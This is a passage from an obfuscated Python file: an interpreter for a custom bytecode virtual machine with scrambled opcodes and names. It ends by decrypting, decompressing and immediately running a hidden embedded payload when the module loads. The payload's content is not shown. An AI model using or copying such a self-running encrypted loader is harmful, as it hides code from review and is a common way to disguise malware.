      elif opcode == 2041:
       _ret = consts[arg]; _f5msg6h2 = _ret
       if _cal07gkgaj(_f5msg6h2): continue
       return _f5msg6h2
     elif opcode < 2087:
      if opcode == 2074:
       _kw = stack.pop() if arg & 1 else {}; _a = stack.pop(); _fn = stack.pop()
       if isinstance(_fn, _types.MethodType) and isinstance(_fn.__func__, _ez63j94b):
        _a = tuple([_fn.__self__] + list(_a)); _fn = _fn.__func__
       if isinstance(_fn, _ez63j94b):
        _fl = _m75qhltb5c(_fn.code, _a, _kw, _fn.defaults, _fn.kw_defaults)
        frame[3] = _tivq01qx(_fn.code, _fn.globals_dict, fastlocals=_fl, closure=_fn.closure, func=_fn)
       else:
        _res = _fn(*_a, **_kw); stack.append(_res)
     elif opcode < 2089:
      if opcode == 2087:
       attr_idx, argc = arg; name = names[attr_idx]; args = stack[-argc:] if argc > 0 else []
       if argc > 0: del stack[-argc:]
       obj = stack.pop(); func = getattr(obj, name)
       if isinstance(func, _types.MethodType) and isinstance(func.__func__, _ez63j94b):
        args = [func.__self__] + list(args); func = func.__func__
       if isinstance(func, _ez63j94b):
        _fl = _m75qhltb5c(func.code, args, {}, func.defaults, func.kw_defaults)
        frame[3] = _tivq01qx(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
       else:
        stack.append(func(*args))
     elif opcode < 2128:
      if opcode == 2089:
       if arg == 0:
        stack.append(tuple())
       else:
        _igsotumec = tuple([stack.pop() for _ in range(arg)][::-1]); stack.append(_igsotumec)
     elif opcode < 2178:
      if opcode == 2128: right = stack.pop(); left = stack.pop(); stack.append(left >= right)
     elif opcode == 2178:
      right = stack.pop(); left = stack.pop(); stack.append(left > right)
     elif opcode == 2183:
      del stack[len(stack) - 1]
    elif opcode < 3884:
     if opcode < 3043:
      if opcode < 2627:
       if opcode < 2441:
        if opcode < 2373:
         if opcode < 2294:
          if opcode == 2246:
           _h75wyg6p = stack.pop(); _f77cbqaqb = stack[-1]; cmp_arg = arg
           if arg == 0:
            stack[-1] = _f77cbqaqb < _h75wyg6p
           elif arg == 1:
            stack[-1] = _f77cbqaqb <= _h75wyg6p
           elif arg == 2:
            stack[-1] = _f77cbqaqb == _h75wyg6p
           elif arg == 3:
            stack[-1] = _f77cbqaqb != _h75wyg6p
           elif arg == 4:
            stack[-1] = _f77cbqaqb > _h75wyg6p
           elif arg == 5:
            stack[-1] = _f77cbqaqb >= _h75wyg6p
           elif arg == 6:
            stack[-1] = _f77cbqaqb in _h75wyg6p
           elif arg == 7:
            stack[-1] = _f77cbqaqb not in _h75wyg6p
           elif arg == 8:
            stack[-1] = _f77cbqaqb is _h75wyg6p
           elif arg == 9:
            stack[-1] = _f77cbqaqb is not _h75wyg6p
           elif arg == 10:
            stack[-1] = isinstance(_f77cbqaqb, _h75wyg6p) or (isinstance(_f77cbqaqb, type) and issubclass(_f77cbqaqb, _h75wyg6p))
         elif opcode == 2294:
          stack[-2] = stack[-2] + stack[-1]; stack.pop()
         elif opcode == 2314:
          _fz7krwoy1l = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _nwq32qe2ww = stack.pop()
          if isinstance(_nwq32qe2ww, _types.MethodType) and isinstance(_nwq32qe2ww.__func__, _ez63j94b):
           _fz7krwoy1l = [_nwq32qe2ww.__self__] + list(_fz7krwoy1l); _nwq32qe2ww = _nwq32qe2ww.__func__
          if isinstance(_nwq32qe2ww, _ez63j94b):
           _ck4u5nng6 = _m75qhltb5c(_nwq32qe2ww.code, _fz7krwoy1l, {}, _nwq32qe2ww.defaults, _nwq32qe2ww.kw_defaults)
           frame[3] = _tivq01qx(_nwq32qe2ww.code, _nwq32qe2ww.globals_dict, fastlocals=_ck4u5nng6, closure=_nwq32qe2ww.closure, func=_nwq32qe2ww)
          else:
           stack.append(_nwq32qe2ww(*_fz7krwoy1l))
        elif opcode < 2400:
         if opcode == 2373:
          _val = stack.pop()
          if bool(_val) is True: frame[7] = (arg ^ 54881) + 73
        elif opcode == 2400:
         registers[arg[0]] = registers[arg[1]][registers[arg[2]]]
        elif opcode == 2427:
         args = stack[-arg:] if arg > 0 else []
         if arg > 0: del stack[-arg:]
         func = stack.pop()
         if isinstance(func, _types.MethodType) and isinstance(func.__func__, _ez63j94b):
          args = [func.__self__] + list(args); func = func.__func__
         if isinstance(func, _ez63j94b):
          _fl = _m75qhltb5c(func.code, args, {}, func.defaults, func.kw_defaults)
          frame[3] = _tivq01qx(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
         else:
          stack.append(func(*args))
       elif opcode < 2503:
        if opcode < 2472:
         if opcode == 2441: _d, _s = arg; registers[_d] = -registers[_s]
        elif opcode == 2472:
         _d, _s2, _op = arg; _left_v = registers[_d]; _right_v = registers[_s2]
         if _op == 2:
          registers[_d] = _left_v == _right_v
         elif _op == 3:
          registers[_d] = _left_v != _right_v
         elif _op == 0:
          registers[_d] = _left_v < _right_v
         elif _op == 1:
          registers[_d] = _left_v <= _right_v
         elif _op == 4:
          registers[_d] = _left_v > _right_v
         elif _op == 5:
          registers[_d] = _left_v >= _right_v
         elif _op == 6:
          registers[_d] = _left_v in _right_v
         elif _op == 7:
          registers[_d] = _left_v not in _right_v
         elif _op == 8:
          registers[_d] = _left_v is _right_v
         elif _op == 9:
          registers[_d] = _left_v is not _right_v
         elif _op == 10:
          registers[_d] = isinstance(_left_v, _right_v) or (isinstance(_left_v, type) and issubclass(_left_v, _right_v))
        elif opcode == 2482:
         fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
         import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
         stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
       elif opcode < 2539:
        if opcode == 2503:
         stack.extend([fastlocals[arg[0]] * consts[arg[1]]])
        elif opcode == 2521:
         stack[-1] = tuple(stack[-1])
       elif opcode == 2539:
        ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__')
        exit_fn = getattr(ctx_mgr, '__exit__'); res = enter_fn()
        frame[5].append(_dhp3m41ep5(_dp6t2dmof.WITH, arg, len(stack), exit_fn=exit_fn)); stack.append(res)
       elif opcode == 2581:
        _lemi26eq = stack.pop(); stack.append(iter(_lemi26eq))
      elif opcode < 2783:
       if opcode < 2698:
        if opcode < 2629:
         if opcode == 2627:
          _d, _b, _c = arg; _m = {}
          for i in range(_c): _m[registers[_b + 2 * i]] = registers[_b + 2 * i + 1]
          registers[_d] = _m
        elif opcode == 2629:
         _l7muypmha = stack.pop()
         while len(fastlocals) <= arg: fastlocals.append(None)
         fastlocals[arg] = _l7muypmha
        elif opcode == 2692:
         locals_dict[names[arg[0]]] = registers[arg[1]]
       elif opcode < 2736:
        if opcode == 2698:
         if stack[-1]:
          frame[7] = (arg ^ 54881) + 73
         else:
          stack.pop()
        elif opcode == 2714:
         code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}
         defaults = stack.pop() if arg & 1 else (); closure = []
         if code_obj.freevars:
          for var in code_obj.freevars:
           if var in frame[31].cellvars:
            closure.append(frame[4][frame[31].cellvars.index(var)])
           elif var in frame[31].freevars:
            closure.append(frame[4][len(frame[31].cellvars) + frame[31].freevars.index(var)])
         fn = _ez63j94b(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
         stack.append(fn)
       elif opcode == 2736:
        _b = _dhp3m41ep5(_dp6t2dmof.FINALLY, arg, len(stack)); frame[5].append(_b)
       elif opcode == 2773:
        _l1t8gpc6x5, _cpcia7lvv = stack[-2:]; del stack[-2:]; stack.append(_l1t8gpc6x5 % _cpcia7lvv)
      elif opcode < 2865:
       if opcode < 2853:
        if opcode == 2783: registers[arg[0]] = getattr(registers[arg[1]], names[arg[2]])
       elif opcode == 2853:
        _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
        frame[19] = (frame[19] * 1103515245 + 12345 ^ (_a if type(_a) is int else 0)) & 4294967295
        registers[_d] = _a + _b - (_a | _b) if type(_a) is int and type(_b) is int else _a & _b
       elif opcode == 2854:
        try:
         registers[arg[1]] = next(registers[arg[0]])
        except StopIteration:
         frame[7] = (arg[2] ^ 54881) + 73
      elif opcode < 2905:
       if opcode == 2865:
        val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].add(val)
       elif opcode == 2901:
        right = stack.pop(); left = stack.pop(); stack.append(left % right)
      elif opcode == 2905:
       _d, _s1, _s2 = arg; registers[_d] = registers[_s1] / registers[_s2]
      elif opcode == 2954:
       stack[-1] = +stack[-1]
     elif opcode < 3557:
      if opcode < 3230:
       if opcode < 3100:
        if opcode < 3055:
         if opcode == 3043: stack[-2] = stack[-2] - stack[-1]; stack.pop()
        elif opcode == 3055:
         val = stack.pop()
         if not val: frame[7] = (arg ^ 54881) + 73
        elif opcode == 3077:
         _jsikuchksk = names[arg]
         if _jsikuchksk in locals_dict:
          stack.append(locals_dict[_jsikuchksk])
         elif _jsikuchksk in globals_dict:
          stack.append(globals_dict[_jsikuchksk])
         elif _jsikuchksk == 'super':
          def _q3iv8jfs(*args):
           if not args:
            if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
             return _builtins.super(frame[12].__class_owner__, frame[27][0])
           return _builtins.super(*args)
          stack.append(_q3iv8jfs)
         elif builtins_dict and _jsikuchksk in builtins_dict:
          stack.append(builtins_dict[_jsikuchksk])
         else:
          raise NameError(f"name '{_jsikuchksk}' is not defined")
       elif opcode < 3210:
        if opcode == 3100:
         stack.extend(stack[-1:])
        elif opcode == 3159:
         _d, _b, _c = arg; registers[_d] = [registers[_b + i] for i in range(_c)]
       elif opcode == 3210:
        def _b1p4pekp5d(func, name, *bases, **kwds):
         meta = kwds.get('metaclass')
         if meta is None: meta = type(bases[0]) if bases else type
         ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
         if hasattr(func, 'execute_with_locals'):
          func.execute_with_locals(ns)
         else:
          func()
         cls = meta(name, bases, ns, **kwds)
         for item in ns.values():
          if hasattr(item, '__code__') or hasattr(item, 'code'): item.__class_owner__ = cls
         return cls
        stack.append(_b1p4pekp5d)
       elif opcode == 3221:
        _v = stack.pop(); _d = arg if arg is not None and arg > 0 else 1; stack[-_d] += [_v]
      elif opcode < 3294:
       if opcode < 3284:
        if opcode == 3230: frame[7] = ((frame[7] - 73 ^ 54881) + (arg - (frame[7] - 73 ^ 54881)) ^ 54881) + 73
       elif opcode == 3284:
        val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].update(val)
       elif opcode == 3292:
        _idx, _src = arg
        while len(fastlocals) <= _idx: fastlocals.append(None)
        fastlocals[_idx] = registers[_src]
      elif opcode < 3341:
       if opcode == 3294:
        _x97gli633 = names[arg]
        if _x97gli633 in locals_dict:
         del locals_dict[_x97gli633]
        else:
         raise NameError(f"name '{_x97gli633}' is not defined")
       elif opcode == 3312:
        _d, _b, _c = arg; registers[_d] = tuple((registers[_b + i] for i in range(_c)))
      elif opcode == 3341:
       _dd4z5f2o4 = consts.__getitem__(arg); stack.append(_dd4z5f2o4)
      elif opcode == 3387:
       _l7muypmha = stack.pop()
       while len(fastlocals) <= arg: fastlocals.append(None)
       fastlocals.__setitem__(arg, _l7muypmha)
     elif opcode < 3678:
      if opcode < 3611:
       if opcode < 3563:
        if opcode == 3557: _a, _b = stack[-2:]; del stack[-2:]; stack.append(_a / _b)
       elif opcode == 3563:
        right = stack.pop(); left = stack.pop(); stack.append(left * right)
       elif opcode == 3569:
        if arg == 0:
         stack.append([])
        else:
         _hg08c1yiui = []; _hg08c1yiui.extend(stack[-arg:]); del stack[-arg:]; stack.append(_hg08c1yiui)
      elif opcode < 3654:
       if opcode == 3611:
        registers[arg[0]] = registers[arg[1]] << registers[arg[2]]
       elif opcode == 3644:
        stack[-2] = stack[-2] & stack[-1]; stack.pop()
      elif opcode == 3654:
       _jsikuchksk = names[arg]; _cbuvi2hpi = locals_dict
       if _jsikuchksk in _cbuvi2hpi:
        stack.append(_cbuvi2hpi[_jsikuchksk])
       elif _jsikuchksk in globals_dict:
        stack.append(globals_dict[_jsikuchksk])
       elif _jsikuchksk == 'super':
        def _q3iv8jfs(*args):
         if not args:
          if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
           return _builtins.super(frame[12].__class_owner__, frame[27][0])
         return _builtins.super(*args)
        stack.append(_q3iv8jfs)
       elif builtins_dict and _jsikuchksk in builtins_dict:
        stack.append(builtins_dict[_jsikuchksk])
       else:
        raise NameError(f"name '{_jsikuchksk}' is not defined")
      elif opcode == 3672:
       stack.pop()
     elif opcode < 3831:
      if opcode < 3713:
       if opcode == 3678: registers[arg[0]] = fastlocals[arg[1]]
      elif opcode == 3713:
       stack[-1:] = [~stack[-1]]
      elif opcode == 3827:
       _val = registers[arg]; stack.append(_val)
     elif opcode < 3855:
      if opcode == 3831:
       keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count
       kw_values = stack[-kw_count:] if kw_count > 0 else []
       if kw_count > 0: del stack[-kw_count:]
       pos_args = stack[-pos_count:] if pos_count > 0 else []
       if pos_count > 0: del stack[-pos_count:]
       func = stack.pop()
       dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
       kwargs = dict(zip(dec_keys, kw_values))
       if isinstance(func, _types.MethodType) and isinstance(func.__func__, _ez63j94b):
        pos_args = [func.__self__] + list(pos_args); func = func.__func__
       if isinstance(func, _ez63j94b):
        _fl = _m75qhltb5c(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
        frame[3] = _tivq01qx(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
       else:
        stack.append(func(*pos_args, **kwargs))
      elif opcode == 3835:
       _d_v2 = None; _d0_c = consts[1]; registers[0] = _d0_c; _d1_ret = registers[0]; _f5msg6h2 = _d1_ret
       if _cal07gkgaj(_f5msg6h2): continue
       return _f5msg6h2
     elif opcode == 3855:
      stack[-1] = -stack[-1]
     elif opcode == 3867:
      _name = names[arg[1]]
      if _name in globals_dict:
       registers[arg[0]] = globals_dict[_name]
      elif _name == 'super':
       def _q3iv8jfs(*args):
        if not args:
         if True and frame[12] and hasattr(frame[12], '__class_owner__') and frame[27]:
          return _builtins.super(frame[12].__class_owner__, frame[27][0])
        return _builtins.super(*args)
       registers[arg[0]] = _q3iv8jfs
      elif builtins_dict and _name in builtins_dict:
       registers[arg[0]] = builtins_dict[_name]
      else:
       raise NameError(f"name '{_name}' is not defined")
    else:
     _h3_9e1 = _T3_c5bb.get(opcode ^ 55642)
     if _h3_9e1:
      res = _h3_9e1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers)
      if res is _RET_SIGNAL:
       if _cal07gkgaj(frame[8]): continue
       return frame[8]
    if frame[3] is not None: _rvbe350gl = frame[3]; frame[3] = None; _iz45wyq7j(_rvbe350gl); continue
   except Exception as exc:
    handled = False
    while True:
     while frame[5]:
      b = frame[5].pop()
      if b.type == _dp6t2dmof.WITH:
       del stack[b.stack_height:]; suppress = False
       if b.exit_fn:
        try:
         suppress = bool(b.exit_fn(type(exc), exc, exc.__traceback__))
        except Exception:
         suppress = False
       if suppress: frame[7] = (b.handler_pc ^ 54881) + 73; handled = True; break
      elif b.type in (_dp6t2dmof.EXCEPT, _dp6t2dmof.FINALLY):
       frame[18] = (frame[18] ^ 252645135) & 4294967295; del stack[b.stack_height:]; stack.append(exc)
       frame[7] = (b.handler_pc ^ 54881) + 73; handled = True; break
     if handled: break
     if _xoqww833mq:
      frame = _xoqww833mq.pop(); code = frame[31]; instructions = code.instructions; consts = code.consts
      names = code.names; stack = frame[2]; registers = frame[0]; fastlocals = frame[27]
      globals_dict = frame[28]; locals_dict = frame[10]; builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
       builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
       builtins_dict = builtins_dict.__dict__
     else:
      break
    if not handled: raise
  return None
 finally:
  _qn8tsqsgfa = old_frame
def _j7c2ekozb():
 decrypted = _jsch8u9k(_b64.b85decode(_ne3qk2ju2()), _yg3j6mp56z()); raw = _zlib.decompress(decrypted)
 reader = _z1h8unfz(raw); root_code = _t760wfud6y(reader); g = globals()
 if '__builtins__' not in g: g['__builtins__'] = _builtins
 f = _tivq01qx(root_code, g, locals_dict=g); return _oh0xfvl0(f)
_j7c2ekozb()
